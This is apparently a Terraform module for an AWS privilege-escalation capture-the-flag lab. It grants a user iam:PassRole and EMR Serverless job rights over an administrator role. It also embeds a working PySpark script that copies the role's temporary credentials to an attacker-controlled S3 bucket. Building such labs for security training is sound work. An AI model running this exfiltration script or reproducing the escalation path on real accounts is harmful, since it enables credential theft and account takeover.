terraform {
  required_providers {
    aws = {
      source                = "hashicorp/aws"
      version               = "~> 6.0"
      configuration_aliases = [aws.prod, aws.attacker]
    }
  }
}

# iam-passrole+emr-serverless-createapplication+emr-serverless-startjobrun privilege escalation scenario
#
# This scenario demonstrates how a user with iam:PassRole, emr-serverless:CreateApplication,
# and emr-serverless:StartJobRun can escalate privileges by:
# 1. Creating an EMR Serverless Spark application
# 2. Starting a job run that passes an admin execution role via iam:PassRole
# 3. The Spark job runs with admin permissions and attaches AdministratorAccess to the starting user
# 4. Starting user now has admin access
#
# The exploit PySpark script is pre-staged in an attacker-controlled S3 bucket.
# EMR Serverless jobs without VPC cannot reach iam.amazonaws.com directly, so the script
# exfiltrates the admin execution role's temporary credentials to S3 for the attacker to retrieve.
#
# Cost: $0/mo at rest (IAM + S3 bucket only, no compute environment needed)
# EMR Serverless is fully managed - no VPC, compute environment, or service-linked role in this module.

# Resource naming convention: pl-prod-emr-serverless-001-to-admin-{resource-type}
# emr-serverless-001 = pathfinding.cloud ID for this scenario

# =============================================================================
# STARTING USER (Initial Access Point)
# =============================================================================

# Scenario-specific starting user
resource "aws_iam_user" "starting_user" {
  provider      = aws.prod
  force_destroy = true
  name          = "pl-prod-emr-serverless-001-to-admin-starting-user"

  tags = {
    Name        = "pl-prod-emr-serverless-001-to-admin-starting-user"
    Environment = var.environment
    Scenario    = "iam-passrole+emr-serverless-createapplication+emr-serverless-startjobrun"
    Purpose     = "starting-user"
  }
}

# Create access keys for the starting user
resource "aws_iam_access_key" "starting_user" {
  provider = aws.prod
  user     = aws_iam_user.starting_user.name
}

# Required permissions policy for exploitation
resource "aws_iam_user_policy" "starting_user_required" {
  provider = aws.prod
  name     = "pl-prod-emr-serverless-001-to-admin-required-permissions"
  user     = aws_iam_user.starting_user.name

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Sid    = "RequiredForExploitationPassRole"
        Effect = "Allow"
        Action = [
          "iam:PassRole"
        ]
        Resource = aws_iam_role.admin_role.arn
      },
      {
        Sid    = "RequiredForExploitationEMRServerless"
        Effect = "Allow"
        Action = [
          "emr-serverless:CreateApplication",
          "emr-serverless:StartJobRun"
        ]
        Resource = "*"
      },
      {
        Sid    = "HelpfulForReconAndMonitoring"
        Effect = "Allow"
        Action = [
          "emr-serverless:GetApplication",
          "emr-serverless:GetJobRun",
          "emr-serverless:ListApplications",
          "iam:ListAttachedUserPolicies"
        ]
        Resource = "*"
      }
    ]
  })
}

# =============================================================================
# TARGET ADMIN ROLE (Privilege Escalation Target)
# =============================================================================

# Admin role that will be passed as the execution role for the EMR Serverless job run.
# This role trusts emr-serverless.amazonaws.com because EMR Serverless assumes it to run Spark jobs.
resource "aws_iam_role" "admin_role" {
  provider              = aws.prod
  force_detach_policies = true
  name                  = "pl-prod-emr-serverless-001-to-admin-admin-role"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Principal = {
          Service = "emr-serverless.amazonaws.com"
        }
        Action = "sts:AssumeRole"
      }
    ]
  })

  tags = {
    Name        = "pl-prod-emr-serverless-001-to-admin-admin-role"
    Environment = var.environment
    Scenario    = "iam-passrole+emr-serverless-createapplication+emr-serverless-startjobrun"
    Purpose     = "admin-target"
  }
}

# Attach AdministratorAccess policy to the admin role
resource "aws_iam_role_policy_attachment" "admin_role_admin_access" {
  provider   = aws.prod
  role       = aws_iam_role.admin_role.name
  policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
}

# The admin role also needs s3:GetObject on the scripts bucket so EMR Serverless
# can fetch the exploit PySpark script at job runtime
resource "aws_iam_role_policy" "admin_role_s3_access" {
  provider = aws.prod
  name     = "pl-prod-emr-serverless-001-to-admin-admin-role-s3-access"
  role     = aws_iam_role.admin_role.id

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Sid    = "readScriptsBucket"
        Effect = "Allow"
        Action = [
          "s3:GetObject"
        ]
        Resource = "${aws_s3_bucket.scripts.arn}/*"
      },
      {
        Sid    = "listScriptsBucket"
        Effect = "Allow"
        Action = [
          "s3:ListBucket"
        ]
        Resource = aws_s3_bucket.scripts.arn
      }
    ]
  })
}

# =============================================================================
# S3 BUCKET (Attacker-Controlled Exploit Script Staging)
# =============================================================================

# S3 bucket for staging the exploit PySpark script that the EMR Serverless job will execute.
# This bucket is attacker-controlled and grants cross-account read access to the prod account.
resource "aws_s3_bucket" "scripts" {
  provider      = aws.attacker
  force_destroy = true
  bucket        = "pl-prod-emr-serverless-001-to-admin-scripts-${var.attacker_account_id}-${var.resource_suffix}"

  tags = {
    Name        = "pl-prod-emr-serverless-001-to-admin-scripts"
    Environment = var.environment
    Scenario    = "iam-passrole+emr-serverless-createapplication+emr-serverless-startjobrun"
    Purpose     = "exploit-script-staging"
  }
}

# Block public access to the scripts bucket
resource "aws_s3_bucket_public_access_block" "scripts" {
  provider = aws.attacker
  bucket   = aws_s3_bucket.scripts.id

  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}

# Bucket policy granting read access to all principals in the prod account.
# This simulates an attacker-controlled bucket that grants access to specific accounts.
resource "aws_s3_bucket_policy" "scripts_policy" {
  provider = aws.attacker
  bucket   = aws_s3_bucket.scripts.id

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Sid    = "AllowProdAccountObjectAccess"
        Effect = "Allow"
        Principal = {
          AWS = "arn:aws:iam::${var.account_id}:root"
        }
        Action = [
          "s3:GetObject",
          "s3:PutObject",
          "s3:DeleteObject"
        ]
        Resource = "${aws_s3_bucket.scripts.arn}/*"
      },
      {
        Sid    = "AllowProdAccountListBucket"
        Effect = "Allow"
        Principal = {
          AWS = "arn:aws:iam::${var.account_id}:root"
        }
        Action = [
          "s3:ListBucket"
        ]
        Resource = aws_s3_bucket.scripts.arn
      }
    ]
  })
}

# Pre-stage the exploit PySpark script in the attacker-controlled bucket.
# EMR Serverless jobs without VPC cannot reach iam.amazonaws.com directly, so
# the script exfiltrates the admin execution role's temporary credentials to S3
# for the attacker to retrieve from their own machine.
resource "aws_s3_object" "exploit_script" {
  provider = aws.attacker
  bucket   = aws_s3_bucket.scripts.id
  key      = "scripts/exploit.py"
  content  = <<-EOT
import sys
import json
import boto3

def exfiltrate_credentials(s3_bucket, s3_key):
    """Extract the execution role's temporary credentials and write them to S3.

    EMR Serverless delivers credentials via the container credential provider
    (AWS_CONTAINER_CREDENTIALS_FULL_URI). boto3 resolves these automatically.
    We extract the raw access key, secret key, and session token, then exfiltrate
    them to S3 (reachable without VPC) for the attacker to retrieve.
    """
    # Extract credentials from the container credential provider
    session = boto3.Session()
    credentials = session.get_credentials().get_frozen_credentials()

    creds_dict = {
        "AccessKeyId": credentials.access_key,
        "SecretAccessKey": credentials.secret_key,
        "SessionToken": credentials.token
    }

    print(f"Extracted credentials for execution role")
    print(f"Access Key ID: {credentials.access_key[:10]}...")

    # Write credentials to S3 (S3 is accessible without VPC)
    s3 = boto3.client('s3')
    s3.put_object(
        Bucket=s3_bucket,
        Key=s3_key,
        Body=json.dumps(creds_dict)
    )
    print(f"SUCCESS: Credentials exfiltrated to s3://{s3_bucket}/{s3_key}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: exploit.py <s3_bucket> <s3_key>")
        sys.exit(1)

    s3_bucket = sys.argv[1]
    s3_key = sys.argv[2]
    print(f"Exfiltrating admin role credentials to s3://{s3_bucket}/{s3_key}")
    exfiltrate_credentials(s3_bucket, s3_key)
EOT

  tags = {
    Name        = "exploit-script"
    Environment = var.environment
    Scenario    = "iam-passrole+emr-serverless-createapplication+emr-serverless-startjobrun"
    Purpose     = "attack-script"
  }
}

# =============================================================================
# CTF FLAG (SSM Parameter)
# =============================================================================

# CTF flag stored in SSM Parameter Store. Retrieved by the attacker once they
# reach administrator-equivalent permissions (AdministratorAccess grants
# ssm:GetParameter implicitly, so no extra IAM wiring is needed).
resource "aws_ssm_parameter" "flag" {
  provider    = aws.prod
  name        = "/pathfinding-labs/flags/emr-serverless-001-to-admin"
  description = "CTF flag for the emr-serverless-001 to-admin scenario"
  type        = "String"
  value       = var.flag_value

  tags = {
    Name        = "pl-prod-emr-serverless-001-to-admin-flag"
    Environment = var.environment
    Scenario    = "iam-passrole+emr-serverless-createapplication+emr-serverless-startjobrun"
    Purpose     = "ctf-flag"
  }
}
